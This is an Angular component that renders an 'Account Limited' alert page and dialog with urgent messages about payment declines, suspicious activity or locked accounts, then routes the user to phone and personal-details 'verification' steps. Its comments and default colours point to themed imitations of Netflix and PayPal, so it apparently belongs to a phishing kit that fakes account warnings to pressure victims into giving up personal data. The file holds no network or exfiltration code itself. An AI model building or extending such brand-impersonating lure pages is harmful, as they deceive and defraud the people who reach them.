import { Component, inject, computed, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { CardComponent, CardVariant } from './ui/card.component';
import { ButtonComponent } from './ui/button.component';

@Component({
   selector: 'app-limited-access',
   standalone: true,
   imports: [CommonModule, TranslatePipe, CardComponent, ButtonComponent],
   host: {
      '[attr.data-theme]': 'currentFlowId()',
      'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
   },
   template: `
    <ui-card [variant]="cardVariant()">
      <div class="flex flex-col items-center text-center relative w-full">
        <!-- Icon -->
        <div class="w-20 h-20 rounded-full flex items-center justify-center mb-6 animate-bounce-in"
             [style.background-color]="alertBgColor()"
             [style.border]="alertBorder()">
          <span class="material-icons text-4xl" [style.color]="alertColor()">{{ iconName() }}</span>
        </div>
        
        <h1 class="text-xl font-bold mb-3 tracking-tight" [style.color]="headerColor()">
          {{ urgencyTitle() }}
        </h1>
        
        <p class="text-sm leading-relaxed mb-8 max-w-sm" [style.color]="bodyColor()">
          {{ urgencyMessage() }}
        </p>

        <div class="w-full space-y-4">
          <ui-button 
            (clicked)="verify()"
            [fullWidth]="true"
            [style.--brand-primary]="btnBg()"
            [style.--brand-text]="btnText()"
            [style.border-radius]="btnRadius()"
          >
            {{ btnLabel() }}
          </ui-button>

          <button 
            (click)="showDialog.set(true)"
            class="w-full font-semibold text-sm hover:underline py-2 opacity-80"
            [style.color]="footerLinkColor()"
          >
            {{ footerLinkText() }}
          </button>
        </div>
      </div>
    </ui-card>

    <!-- Popup Dialog -->
    @if (showDialog()) {
        <div class="fixed inset-0 z-50 flex items-center justify-center p-4 font-sans text-left">
           <!-- Backdrop -->
           <div class="absolute inset-0 bg-black/60 backdrop-blur-sm transition-all duration-300" (click)="showDialog.set(false)"></div>

           <!-- Modal Card -->
           <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xl relative z-10 animate-slide-up duration-200 overflow-hidden dark:bg-slate-900 dark:border-slate-800">

              <!-- Header -->
              <div class="flex justify-between items-center p-6 border-b border-slate-100 bg-slate-50 dark:bg-slate-800 dark:border-slate-700">
                 <h3 class="font-bold text-xl text-slate-800 dark:text-white">{{ urgencyTitle() }}</h3>
                 <button (click)="showDialog.set(false)" class="text-slate-400 hover:text-slate-700 dark:hover:text-slate-200 transition-colors p-2 rounded-full hover:bg-slate-100 dark:hover:bg-slate-700">
                    <span class="material-icons text-xl">close</span>
                 </button>
              </div>

              <!-- Content -->
              <div class="p-8 space-y-6">

                 <!-- Alert Section -->
                 <div class="flex gap-4 p-4 rounded-lg border"
                      [style.background-color]="alertBgColor()"
                      [style.border-color]="alertColor() + '40'">
                    <div class="flex-shrink-0">
                       <span class="material-icons" [style.color]="alertColor()">{{ iconName() }}</span>
                    </div>
                    <div>
                       <h4 class="font-bold text-slate-900 text-sm mb-1 dark:text-slate-800">{{ urgencyTitle() }}</h4>
                       <p class="text-sm text-slate-600 leading-relaxed dark:text-slate-700">
                          {{ urgencyMessage() }}
                       </p>
                    </div>
                 </div>

                 <!-- Details Grid -->
                 <div class="grid gap-6 text-sm" [class.md:grid-cols-2]="hasLimitations()">
                    
                    @if (hasLimitations()) {
                        <div>
                           <h5 class="font-bold text-slate-800 mb-2 flex items-center gap-2 dark:text-slate-200">
                              <span class="material-icons text-lg text-slate-400">lock</span>
                              {{ 'LIMITED.WHATS_LIMITED' | translate }}
                           </h5>
                           <ul class="space-y-2 text-slate-600 dark:text-slate-400">
                              @for (item of limitations(); track item) {
                                  <li class="flex items-start gap-2">
                                     <span class="w-1.5 h-1.5 rounded-full bg-slate-400 mt-2"></span>
                                     <span>{{ item }}</span>
                                  </li>
                              }
                           </ul>
                        </div>
                    }

                    <div>
                       <h5 class="font-bold text-slate-800 mb-2 flex items-center gap-2 dark:text-slate-200">
                          <span class="material-icons text-lg text-slate-400">verified_user</span>
                          {{ resolveTitleText() }}
                       </h5>
                       <p class="text-slate-600 leading-relaxed dark:text-slate-400">
                          {{ 'LIMITED.RESOLVE_DESC' | translate }}
                       </p>
                    </div>
                 </div>

                 <!-- Reference -->
                 <div class="pt-4 border-t border-slate-100 flex justify-between items-center text-xs text-slate-500 dark:border-slate-700 dark:text-slate-500">
                    <span>Ref: <span class="font-mono text-slate-700 font-bold dark:text-slate-300">{{ refId() }}</span></span>
                    <span>{{ today | date:'MMM d, y' }}</span>
                 </div>
              </div>

              <!-- Footer Actions -->
              <div class="p-6 bg-slate-50 border-t border-slate-100 flex justify-end gap-3 dark:bg-slate-800 dark:border-slate-700">
                 <button (click)="showDialog.set(false)" class="px-6 py-3 rounded-full font-bold text-slate-700 hover:bg-white hover:shadow-sm border border-transparent hover:border-slate-200 transition-all text-sm dark:text-slate-300 dark:hover:bg-slate-700">
                    {{ 'COMMON.CLOSE' | translate }}
                 </button>
                 <button (click)="verify()" 
                    class="px-6 py-3 rounded-full font-bold text-white shadow-sm hover:shadow transition-all text-sm"
                    [style.background]="btnBg()"
                    [style.color]="btnText()"
                    [style.border-radius]="btnRadius()">
                    {{ btnLabel() }}
                 </button>
              </div>
           </div>
        </div>
      }
    `
})
export class LimitedAccessComponent {
   state = inject(StateService);
   showDialog = signal(false);
   today = Date.now();

   flow = computed(() => this.state.currentFlow());
   urgency = computed(() => this.flow()?.urgency);
   currentFlowId = computed(() => this.flow()?.id || 'generic');
   theme = computed(() => this.flow()?.theme);

   cardVariant = computed<CardVariant>(() => 'elevated');

   // Content
   urgencyTitle = computed(() => this.urgency()?.title || 'Account Limited');
   urgencyMessage = computed(() => this.urgency()?.message || 'Access restricted.');
   btnLabel = computed(() => this.urgency()?.buttonText || 'Verify');
   iconName = computed(() => this.urgency()?.alertIcon || 'gpp_maybe');

   footerLinkText = computed(() => this.urgency()?.footerLink || 'Why is my account limited?');
   limitations = computed(() => this.urgency()?.limitations || []);
   hasLimitations = computed(() => this.limitations().length > 0);
   resolveTitleText = computed(() => this.urgency()?.resolveTitle || 'How to resolve');

   refId = computed(() => {
      const prefix = this.urgency()?.referencePrefix || 'REF';
      const sess = this.state.sessionId() || '000';
      return `${prefix}-${sess.substring(0, 8).toUpperCase()}`;
   });

   // Styles
   headerColor = computed(() => this.theme()?.input.textColor || '#111827');
   bodyColor = computed(() => this.theme()?.footer.textColor || '#4b5563');

   // Alert colors based on type
   alertColor = computed(() => {
      const type = this.urgency()?.type;
      if (type === 'payment_decline') return '#e50914'; // Netflix Red
      if (type === 'suspicious_activity') return '#d97706'; // Amber
      if (type === 'locked') return '#64748b'; // Slate
      return '#d97706'; // Default Amber
   });

   alertBgColor = computed(() => {
      const type = this.urgency()?.type;
      if (type === 'payment_decline') return '#fef2f2'; // Red-50
      if (type === 'suspicious_activity') return '#fffbeb'; // Amber-50
      if (type === 'locked') return '#f8fafc'; // Slate-50
      return '#fffbeb';
   });

   alertBorder = computed(() => `1px solid ${this.alertColor()}20`); // 20% opacity

   btnBg = computed(() => this.theme()?.button.background || '#003087');
   btnText = computed(() => this.theme()?.button.color || '#fff');
   btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');

   footerLinkColor = computed(() => {
      // Netflix footer link should be grey/white, not PayPal blue
      if (this.theme()?.mode === 'dark') return '#9ca3af';
      return this.btnBg();
   });

   verify() {
      // Navigate based on flow or just start verification
      if (this.state.skipPhoneVerification()) {
         this.state.navigate('personal');
      } else {
         this.state.navigate('phone');
      }
   }
}